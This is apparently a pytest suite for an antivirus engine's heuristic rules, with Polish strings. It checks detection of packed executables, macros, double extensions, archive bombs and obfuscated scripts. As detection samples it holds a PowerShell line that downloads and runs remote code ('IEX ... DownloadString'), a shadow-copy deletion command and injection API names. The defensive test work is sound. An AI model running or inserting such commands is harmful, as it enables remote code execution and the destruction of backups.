"""Tests for aegis.core.heuristics.

Half of these are false-positive guards: a heuristic that fires on a benign
document is worse than one that misses, because the product quarantines things.
"""

from __future__ import annotations

import base64
import io
import os
import struct
import zipfile

import pytest

from aegis.core import heuristics as H
from aegis.models import (
    SCORE_HEURISTIC_STRONG,
    SCORE_HEURISTIC_WEAK,
    DetectionLayer,
)

# --------------------------------------------------------------------------
# sample builders
# --------------------------------------------------------------------------
SEC_CODE = 0x00000020
SEC_EXEC = 0x20000000
SEC_READ = 0x40000000
SEC_WRITE = 0x80000000
PE_OFFSET = 0x80
OPT_SIZE = 0xE0

BENIGN_CODE = bytes([0x55, 0x8B, 0xEC, 0x33, 0xC0, 0x90, 0xC3, 0xE8, 0x00, 0x00]) * 200


def build_pe(
    sections: list[dict],
    *,
    entry_rva: int = 0x1000,
    imports: tuple[str, ...] = (),
    dotnet: bool = False,
    characteristics: int = 0x0102,
) -> bytes:
    """Assemble a minimal but structurally valid PE32 image."""
    count = len(sections)
    table_start = PE_OFFSET + 4 + 20 + OPT_SIZE
    headers_end = table_start + 40 * count
    align = 0x200
    raw_ptr = ((headers_end + align - 1) // align) * align

    import_rva = import_size = 0
    entries: list[bytes] = []
    bodies: list[tuple[int, bytes]] = []
    vaddr = 0x1000
    for index, spec in enumerate(sections):
        body = spec.get("body", b"")
        if index == 0 and imports:
            blob, import_rva, import_size = _import_blob(vaddr + len(body), imports)
            body = body + blob
        raw_size = spec.get("raw_size", len(body))
        vsize = spec.get("vsize", max(len(body), raw_size, 0x10))
        entries.append(
            struct.pack(
                "<8sIIIIIIHHI",
                spec["name"],
                vsize,
                vaddr,
                raw_size,
                raw_ptr if raw_size else 0,
                0,
                0,
                0,
                0,
                spec.get("chars", SEC_READ | SEC_CODE | SEC_EXEC),
            )
        )
        if raw_size:
            bodies.append((raw_ptr, body[:raw_size]))
            raw_ptr += ((raw_size + align - 1) // align) * align
        vaddr += ((max(vsize, 1) + 0xFFF) // 0x1000) * 0x1000

    dos = bytearray(PE_OFFSET)
    dos[0:2] = b"MZ"
    dos[0x3C:0x40] = struct.pack("<I", PE_OFFSET)
    coff = struct.pack("<HHIIIHH", 0x14C, count, 0, 0, 0, OPT_SIZE, characteristics)
    opt = bytearray(OPT_SIZE)
    struct.pack_into("<H", opt, 0, 0x10B)
    struct.pack_into("<I", opt, 16, entry_rva)
    struct.pack_into("<I", opt, 28, 0x400000)
    struct.pack_into("<I", opt, 92, 16)
    struct.pack_into("<II", opt, 96 + 8, import_rva, import_size)
    if dotnet:
        struct.pack_into("<II", opt, 96 + 112, 0x3000, 0x48)

    out = bytearray(dos + b"PE\x00\x00" + coff + bytes(opt) + b"".join(entries))
    for ptr, body in bodies:
        if len(out) < ptr:
            out += b"\x00" * (ptr - len(out))
        out[ptr : ptr + len(body)] = body
    return bytes(out)


def _import_blob(base_rva: int, dll_names: tuple[str, ...]) -> tuple[bytes, int, int]:
    desc_size = 20 * (len(dll_names) + 1)
    names_rva = base_rva + desc_size
    name_blob = bytearray()
    descriptors = bytearray()
    rvas = []
    for name in dll_names:
        rvas.append(names_rva + len(name_blob))
        name_blob += name.encode() + b"\x00"
    for rva in rvas:
        descriptors += struct.pack("<IIIII", 0, 0, 0, rva, 0)
    descriptors += b"\x00" * 20
    return bytes(descriptors + name_blob), base_rva, desc_size


def clean_pe() -> bytes:
    return build_pe(
        [
            {"name": b".text\x00\x00\x00", "chars": SEC_READ | SEC_CODE | SEC_EXEC, "body": BENIGN_CODE},
            {"name": b".data\x00\x00\x00", "chars": SEC_READ | SEC_WRITE, "body": b"\x00" * 512 + b"Witaj\x00"},
        ],
        entry_rva=0x1000,
        imports=("KERNEL32.dll", "USER32.dll", "msvcrt.dll"),
    )


def packed_pe() -> bytes:
    return build_pe(
        [
            {
                "name": b"UPX0\x00\x00\x00\x00",
                "chars": SEC_READ | SEC_WRITE | SEC_EXEC,
                "body": b"",
                "raw_size": 0,
                "vsize": 0x8000,
            },
            {
                "name": b"UPX1\x00\x00\x00\x00",
                "chars": SEC_READ | SEC_WRITE | SEC_EXEC | SEC_CODE,
                "body": os.urandom(20000),
            },
        ],
        entry_rva=0x90000,
    )


def make_zip(items: dict[str, bytes], compression: int = zipfile.ZIP_DEFLATED) -> bytes:
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", compression) as archive:
        for name, payload in items.items():
            archive.writestr(name, payload)
    return buffer.getvalue()


def rules_of(detections) -> set[str]:
    return {d.rule for d in detections}


# --------------------------------------------------------------------------
# primitives
# --------------------------------------------------------------------------
def test_shannon_entropy_bounds() -> None:
    assert H.shannon_entropy(b"") == 0.0
    assert H.shannon_entropy(b"A") == 0.0
    assert H.shannon_entropy(b"\x00" * 10000) == 0.0
    assert H.shannon_entropy(b"\x00\x01" * 5000) == pytest.approx(1.0)
    assert H.shannon_entropy(bytes(range(256)) * 10) == pytest.approx(8.0)
    assert H.shannon_entropy(os.urandom(200000)) > 7.9
    assert 3.0 < H.shannon_entropy(b"Zwyczajny polski tekst o antywirusie. " * 200) < 5.5


@pytest.mark.parametrize(
    "data,expected",
    [
        (b"MZ" + b"\x00" * 100, "pe"),
        (b"\x7fELF\x02\x01\x01" + b"\x00" * 100, "elf"),
        (b"\xcf\xfa\xed\xfe" + b"\x00" * 100, "macho"),
        (b"PK\x03\x04" + b"\x00" * 100, "zip"),
        (b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 100, "ole"),
        (b"%PDF-1.7\n trailer", "pdf"),
        (b"#!/bin/sh\necho hi\n", "script"),
        (b"Zwyczajna notatka po polsku.\n", "text"),
        (b"\x00\x01\x02\xff\xfe\x13\x99" * 50, "data"),
        (b"", "data"),
    ],
)
def test_detect_file_type(data: bytes, expected: str) -> None:
    assert H.detect_file_type(data) == expected


def test_heuristic_rules_catalogue_is_complete() -> None:
    assert H.HEURISTIC_RULES, "GUI needs a non-empty rule list"
    for rule in H.HEURISTIC_RULES:
        assert set(rule) >= {"id", "name", "description", "score"}
        assert rule["name"] and rule["description"]
        assert SCORE_HEURISTIC_WEAK <= rule["score"] <= SCORE_HEURISTIC_STRONG
    ids = [rule["id"] for rule in H.HEURISTIC_RULES]
    assert len(ids) == len(set(ids))
    assert {"eicar", "high_entropy", "pe_anomaly", "suspicious_api_strings",
            "script_obfuscation", "office_macro", "double_extension",
            "embedded_executable", "archive_bomb_hint"} == set(ids)


# --------------------------------------------------------------------------
# contract-wide invariants
# --------------------------------------------------------------------------
def _all_samples() -> list[tuple[str, bytes]]:
    return [
        ("/t/eicar.com", _eicar()),
        ("/t/packed.exe", packed_pe()),
        ("/t/faktura.pdf.exe", b"MZ" + b"\x00" * 500),
        ("/t/doc.docm", make_zip({"word/vbaProject.bin": b"\xd0\xcf\x11\xe0stub"})),
        ("/t/evil.js", _obfuscated_js()),
    ]


def _eicar() -> bytes:
    return (r"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR" + r"-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*").encode()


def _obfuscated_js() -> bytes:
    blob = base64.b64encode(os.urandom(400)).decode()
    return (
        f"eval(atob('{blob}'));\n"
        + "var s = String.fromCharCode(72) + String.fromCharCode(73);\n" * 15
    ).encode()


def test_every_detection_obeys_the_layer_contract() -> None:
    for path, data in _all_samples():
        detections = H.analyze(path, data)
        assert detections, f"brak wykrycia dla {path}"
        for det in detections:
            assert det.layer is DetectionLayer.HEURISTIC
            assert SCORE_HEURISTIC_WEAK <= det.score <= SCORE_HEURISTIC_STRONG
            assert 0.0 < det.confidence <= 1.0
            assert det.rule and det.threat_name and det.detail
            assert det.rule in {r["id"] for r in H.HEURISTIC_RULES}


def test_analyze_tolerates_missing_path_and_empty_data() -> None:
    assert H.analyze(None, b"") == []
    detections = H.analyze(None, _eicar())
    assert rules_of(detections) == {"eicar"}
    assert detections[0].path is None


# --------------------------------------------------------------------------
# false positives
# --------------------------------------------------------------------------
BENIGN_SAMPLES = {
    "notatka.txt": "Spotkanie w czwartek o 10:00. Przynieś umowę i pendrive'a.\n".encode() * 30,
    "app.py": b"import os\n\n\ndef main():\n    print('hello')\n\n\nmain()\n" * 20,
    "app.js": b"function add(a, b) {\n  return a + b;\n}\nconsole.log(add(1, 2));\n" * 20,
    "styl.css": b"body { margin: 0; padding: 0; font-family: sans-serif; }\n" * 30,
    "clean.exe": clean_pe(),
    "umowa.docx": make_zip({"[Content_Types].xml": b"<Types/>", "word/document.xml": b"<w:p>Umowa</w:p>"}),
    "paczka.zip": make_zip({"a.txt": b"zwyczajna tresc " * 100, "b.txt": b"druga " * 100}),
    "obraz.png": b"\x89PNG\r\n\x1a\n" + os.urandom(40000),
    "dane.bin": bytes(range(256)) * 20,
    "pusty.txt": b"",
    "logo.svg": b'<svg xmlns="http://www.w3.org/2000/svg"><rect width="10" height="10"/></svg>',
}


@pytest.mark.parametrize("name", sorted(BENIGN_SAMPLES))
def test_benign_files_produce_no_detections(name: str) -> None:
    detections = H.analyze(f"/home/user/{name}", BENIGN_SAMPLES[name])
    assert detections == [], [d.to_dict() for d in detections]


def test_long_filler_run_is_not_mistaken_for_an_encoded_payload() -> None:
    """``"A" * 4000`` matches the base64 alphabet but carries no payload."""
    assert H.analyze("/t/ascii-art.txt", b"A" * 4000 + b"\n") == []


def test_readme_mentioning_one_suspicious_command_stays_below_low() -> None:
    from aegis.engine.verdict import fuse
    from aegis.models import Severity

    data = b"Aby uruchomic program, wpisz: chmod +x install.sh\n" * 5
    score, severity = fuse(H.analyze("/t/README.txt", data))
    assert severity is Severity.CLEAN, f"score={score}"


# --------------------------------------------------------------------------
# rule: eicar
# --------------------------------------------------------------------------
def test_eicar_is_detected_with_full_confidence(eicar_bytes: bytes) -> None:
    detections = H.analyze("/t/eicar.com", eicar_bytes)
    assert len(detections) == 1
    det = detections[0]
    assert det.rule == "eicar"
    assert det.threat_name == "Sim.Eicar.TestFile"
    assert det.score == SCORE_HEURISTIC_STRONG
    assert det.confidence == 1.0


def test_eicar_is_found_when_padded(eicar_bytes: bytes) -> None:
    detections = H.analyze("/t/eicar.txt", b"\x00" * 100 + eicar_bytes + b"   \n")
    assert rules_of(detections) >= {"eicar"}
    assert "100" in detections[0].detail


def test_heuristics_module_does_not_contain_the_eicar_string(eicar_bytes: bytes) -> None:
    """Otherwise the engine flags its own source file (and so would other AVs)."""
    source = open(H.__file__, "rb").read()
    assert eicar_bytes not in source


# --------------------------------------------------------------------------
# rule: pe_anomaly / high_entropy
# --------------------------------------------------------------------------
def test_clean_pe_has_no_pe_anomaly() -> None:
    assert "pe_anomaly" not in rules_of(H.analyze("/t/clean.exe", clean_pe()))


def test_packed_pe_triggers_anomaly_and_entropy() -> None:
    detections = H.analyze("/t/packed.exe", packed_pe())
    assert {"pe_anomaly", "high_entropy"} <= rules_of(detections)
    anomaly = next(d for d in detections if d.rule == "pe_anomaly")
    assert anomaly.score == SCORE_HEURISTIC_STRONG
    assert "UPX" in anomaly.detail
    assert "import" in anomaly.detail


def test_writable_text_section_is_an_anomaly() -> None:
    data = build_pe(
        [{"name": b".text\x00\x00\x00", "chars": SEC_READ | SEC_WRITE | SEC_EXEC | SEC_CODE,
          "body": BENIGN_CODE}],
        imports=("KERNEL32.dll", "USER32.dll"),
    )
    detection = next(d for d in H.analyze("/t/w.exe", data) if d.rule == "pe_anomaly")
    assert "zapisywalna" in detection.detail


def test_entrypoint_outside_sections_is_an_anomaly() -> None:
    data = build_pe(
        [{"name": b".text\x00\x00\x00", "body": BENIGN_CODE}],
        entry_rva=0xDEAD000,
        imports=("KERNEL32.dll", "USER32.dll"),
    )
    detection = next(d for d in H.analyze("/t/e.exe", data) if d.rule == "pe_anomaly")
    assert "punkt wejścia" in detection.detail


def test_random_section_name_is_an_anomaly() -> None:
    data = build_pe(
        [{"name": b"\x81\x9f\x03\xe2\x00\x00\x00\x00", "body": BENIGN_CODE}],
        imports=("KERNEL32.dll", "USER32.dll"),
    )
    detection = next(d for d in H.analyze("/t/r.exe", data) if d.rule == "pe_anomaly")
    assert "nazwa sekcji" in detection.detail


def test_dotnet_assembly_with_one_import_is_not_flagged() -> None:
    """Every .NET binary imports only mscoree.dll - flagging that is a FP factory."""
    data = build_pe(
        [{"name": b".text\x00\x00\x00", "body": BENIGN_CODE}],
        imports=("mscoree.dll",),
        dotnet=True,
    )
    assert "pe_anomaly" not in rules_of(H.analyze("/t/net.exe", data))


def test_native_binary_with_one_import_is_flagged() -> None:
    data = build_pe(
        [{"name": b".text\x00\x00\x00", "body": BENIGN_CODE}],
        imports=("kernel32.dll",),
    )
    detection = next(d for d in H.analyze("/t/one.exe", data) if d.rule == "pe_anomaly")
    assert "1 importowana" in detection.detail


def test_truncated_pe_header_is_reported_not_crashed() -> None:
    broken = packed_pe()[:200]
    detections = H.analyze("/t/trunc.exe", broken)
    assert "pe_anomaly" in rules_of(detections)


def test_high_entropy_blob_inside_a_calm_file() -> None:
    data = b"Raport miesieczny dzialu sprzedazy. " * 2000 + os.urandom(40000)
    detections = H.analyze("/t/raport.txt", data)
    entropy = next(d for d in detections if d.rule == "high_entropy")
    assert entropy.threat_name == "Heur.Packed.EncryptedBlob"


def test_compressed_containers_are_not_flagged_for_entropy() -> None:
    for payload in (
        b"\x1f\x8b" + os.urandom(50000),            # gzip
        b"\x89PNG\r\n\x1a\n" + os.urandom(50000),   # png
        make_zip({"x.bin": os.urandom(50000)}),     # zip
    ):
        assert "high_entropy" not in rules_of(H.analyze("/t/x", payload))


# --------------------------------------------------------------------------
# rule: suspicious_api_strings
# --------------------------------------------------------------------------
def test_api_strings_score_scales_with_categories() -> None:
    one = H.analyze("/t/a.bin", b"\x00" * 50 + b"CreateRemoteThread" + b"\x00" * 50)
    many = H.analyze(
        "/t/b.bin",
        b"\x00".join(
            [
                b"VirtualAllocEx",
                b"WriteProcessMemory",
                b"SetWindowsHookEx",
                b"CryptEncrypt",
                b"vssadmin delete shadows",
                b"schtasks /create",
                b"powershell -enc",
            ]
        ),
    )
    single = next(d for d in one if d.rule == "suspicious_api_strings")
    multi = next(d for d in many if d.rule == "suspicious_api_strings")
    assert single.weighted < multi.weighted
    assert multi.score == SCORE_HEURISTIC_STRONG, "cap is SCORE_HEURISTIC_STRONG"
    assert multi.score <= SCORE_HEURISTIC_STRONG


def test_api_strings_are_found_in_utf16le() -> None:
    payload = b"\x00" * 64 + "CreateRemoteThread".encode("utf-16-le") + b"\x00" * 64
    payload += "vssadmin delete shadows".encode("utf-16-le")
    detection = next(d for d in H.analyze("/t/u.bin", payload) if d.rule == "suspicious_api_strings")
    assert "wstrzykiwanie kodu" in detection.detail


def test_api_strings_are_case_insensitive() -> None:
    assert "suspicious_api_strings" in rules_of(
        H.analyze("/t/c.bin", b"VSSADMIN DELETE SHADOWS /quiet" + b"\x00" * 40)
    )


# --------------------------------------------------------------------------
# rule: script_obfuscation
# --------------------------------------------------------------------------
def test_obfuscated_script_is_detected() -> None:
    detection = next(
        d for d in H.analyze("/t/evil.js", _obfuscated_js()) if d.rule == "script_obfuscation"
    )
    assert detection.score > SCORE_HEURISTIC_WEAK
    assert "base64" in detection.detail


def test_powershell_one_liner_is_detected() -> None:
    payload = (
        b"powershell -nop -w hidden -enc "
        + base64.b64encode(os.urandom(300))
        + b"\nIEX(New-Object Net.WebClient).DownloadString('http://host/x')\n"
    )
    rules = rules_of(H.analyze("/t/run.ps1", payload))
    assert {"script_obfuscation", "suspicious_api_strings"} <= rules


def test_long_line_alone_is_not_enough() -> None:
    """Minified code and ASCII art have long lines; that is not obfuscation."""
    payload = ("var x = '" + "ab" * 1500 + "';\n").encode()
    assert "script_obfuscation" not in rules_of(H.analyze("/t/long.js", payload))


def test_long_line_strengthens_a_real_signal() -> None:
    blob = base64.b64encode(os.urandom(1800)).decode()
    payload = f"var x = eval(atob('{blob}'));\n".encode()
    detection = next(
        d for d in H.analyze("/t/long.js", payload) if d.rule == "script_obfuscation"
    )
    assert "długa linia" in detection.detail
    assert "base64" in detection.detail


# --------------------------------------------------------------------------
# rule: office_macro
# --------------------------------------------------------------------------
def test_ooxml_with_vbaproject_is_detected() -> None:
    data = make_zip({"[Content_Types].xml": b"<Types/>", "word/vbaProject.bin": b"\xd0\xcf\x11\xe0x"})
    detection = next(d for d in H.analyze("/t/f.docm", data) if d.rule == "office_macro")
    assert detection.threat_name == "Heur.Office.Macro"


def test_docx_extension_hiding_macros_scores_higher() -> None:
    data = make_zip({"word/vbaProject.bin": b"\xd0\xcf\x11\xe0x"})
    docm = next(d for d in H.analyze("/t/f.docm", data) if d.rule == "office_macro")
    docx = next(d for d in H.analyze("/t/f.docx", data) if d.rule == "office_macro")
    assert docx.weighted > docm.weighted
    assert "wprowadza w błąd" in docx.detail


def test_ole_document_with_vba_streams() -> None:
    data = (
        b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1"
        + b"\x00" * 400
        + "_VBA_PROJECT".encode("utf-16-le")
        + b"\x00" * 100
        + "Macros".encode("utf-16-le")
    )
    assert "office_macro" in rules_of(H.analyze("/t/old.doc", data))


def test_rtf_with_embedded_object() -> None:
    data = rb"{\rtf1\ansi {\object\objemb {\*\objdata 0105000002000000}}}" + b"x" * 200
    detection = next(d for d in H.analyze("/t/x.rtf", data) if d.rule == "office_macro")
    assert detection.threat_name == "Heur.Office.RtfObject"


def test_plain_rtf_is_clean() -> None:
    data = rb"{\rtf1\ansi Zwyczajne pismo urzedowe.\par }" + b" " * 200
    assert "office_macro" not in rules_of(H.analyze("/t/ok.rtf", data))


# --------------------------------------------------------------------------
# rule: double_extension
# --------------------------------------------------------------------------
@pytest.mark.parametrize(
    "name,expected_threat",
    [
        ("faktura.pdf.exe", "Heur.Name.DoubleExtension"),
        ("zdjecie.jpg.scr", "Heur.Name.DoubleExtension"),
        ("raport.docx.js", "Heur.Name.DoubleExtension"),
        ("faktura_marzec.exe", "Heur.Name.DecoyName"),
    ],
)
def test_name_tricks_are_detected(name: str, expected_threat: str) -> None:
    detections = [d for d in H.analyze(f"/home/u/{name}", b"MZ" + b"\x00" * 300)
                  if d.rule == "double_extension"]
    assert [d.threat_name for d in detections] == [expected_threat]
    assert all(d.score == SCORE_HEURISTIC_WEAK for d in detections)


def test_rtl_override_in_name_is_detected() -> None:
    detection = next(
        d
        for d in H.analyze("/home/u/faktura‮gpj.exe", b"%PDF-1.4\n" + b"x" * 100)
        if d.rule == "double_extension"
    )
    assert detection.threat_name == "Heur.Name.RtlOverride"
    assert "U+202E" in detection.detail


@pytest.mark.parametrize("name", ["setup.exe", "archive.tar.gz", "notes.txt", "lib.so.6", "a.b.c"])
def test_ordinary_names_are_not_flagged(name: str) -> None:
    detections = H.analyze(f"/home/u/{name}", b"MZ" + b"\x00" * 300)
    assert "double_extension" not in rules_of(detections)


# --------------------------------------------------------------------------
# rule: embedded_executable
# --------------------------------------------------------------------------
def test_pe_embedded_in_a_pdf_is_detected() -> None:
    data = b"%PDF-1.7\n" + b"\x00" * 4000 + clean_pe() + b"\n%%EOF"
    detection = next(
        d for d in H.analyze("/t/doc.pdf", data) if d.rule == "embedded_executable"
    )
    assert "MZ/PE" in detection.detail


def test_elf_embedded_in_a_data_file_is_detected() -> None:
    data = bytes(range(256)) * 8 + b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 4000
    assert "embedded_executable" in rules_of(H.analyze("/t/blob.dat", data))


def test_stray_mz_text_is_not_an_embedded_executable() -> None:
    data = b"%PDF-1.7\n" + b"MZ wystapilo przypadkiem w tekscie. " * 300
    assert "embedded_executable" not in rules_of(H.analyze("/t/doc.pdf", data))


def test_executable_inside_a_zip_is_left_to_the_scanner() -> None:
    data = make_zip({"tool.exe": clean_pe()}, compression=zipfile.ZIP_STORED)
    assert "embedded_executable" not in rules_of(H.analyze("/t/paczka.zip", data))


# --------------------------------------------------------------------------
# rule: archive_bomb_hint
# --------------------------------------------------------------------------
def test_decompression_bomb_hint() -> None:
    data = make_zip({"big.bin": b"\x00" * (20 * 1024 * 1024)})
    detection = next(d for d in H.analyze("/t/bomb.zip", data) if d.rule == "archive_bomb_hint")
    assert "bomb" in detection.threat_name.lower()
    assert ":1" in detection.detail


def test_normal_archive_is_not_a_bomb() -> None:
    data = make_zip({f"plik{n}.txt": os.urandom(2000) for n in range(20)})
    assert "archive_bomb_hint" not in rules_of(H.analyze("/t/ok.zip", data))


def test_bomb_hint_uses_the_config_limit(config) -> None:
    config.archive_max_uncompressed = 4096
    data = make_zip({"x.bin": b"\x00" * 100000})
    assert "archive_bomb_hint" in rules_of(H.analyze("/t/x.zip", data, config=config))
    config.archive_max_uncompressed = 256 * 1024 * 1024
    assert "archive_bomb_hint" not in rules_of(H.analyze("/t/x.zip", data, config=config))


# --------------------------------------------------------------------------
# robustness
# --------------------------------------------------------------------------
def test_a_broken_rule_cannot_abort_the_analysis(monkeypatch) -> None:
    def explode(_facts):
        raise RuntimeError("boom")

    monkeypatch.setattr(H, "_RULES", (explode,) + H._RULES)
    assert rules_of(H.analyze("/t/eicar.com", _eicar())) == {"eicar"}


@pytest.mark.parametrize(
    "data",
    [
        b"MZ",
        b"MZ" + b"\x00" * 0x3C + b"\xff\xff\xff\xff",
        b"PK\x03\x04" + b"\x00" * 10,
        b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1",
        b"\x00",
        bytes([0]) * 5000,
    ],
)
def test_truncated_and_degenerate_input_never_raises(data: bytes) -> None:
    H.analyze("/t/x.bin", data)
    H.detect_file_type(data)
    H.shannon_entropy(data)
